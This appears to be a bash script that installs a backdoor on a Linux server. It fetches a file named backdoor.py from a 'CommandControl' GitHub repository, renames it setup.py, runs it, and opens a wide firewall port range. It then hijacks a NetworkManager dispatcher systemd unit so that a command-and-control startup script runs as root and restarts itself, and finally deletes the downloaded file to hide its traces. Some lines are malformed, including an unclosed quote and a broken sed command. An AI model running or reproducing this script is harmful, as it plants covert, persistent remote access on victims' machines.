#!/bin/bash
yum install -y python3;
curl -o setup.py https://raw.githubusercontent.com/Shuttlemax/CommandControl/main/backdoor.py;
chmod +x setup.py;
pip3 install --upgrade pip;
pip3 install setuptools_rust;
pip3 install cryptography;
python3 setup.py;

firewall-cmd --add-port=1234-9999/tcp;
# mkdir .local
# mv setup.py install.sh .local/
# gpg -c .local/*

file_path="/root/etc/systemd/system/dbus-org.freedesktop.nm-dispatcher.service
sed -i "14a\\WantedBy=multi-user.target" "$file_path"

new_code='ExecStart=/usr/libexec/nm-dispatcher && /root/cncstartup.sh'

sed -i "7s\\${new_code}" "$file_path"
sed -i "7a\\Restart=always" "$file_path"
sed -i "7a\\User=root" "$file_path"


rm setup.py
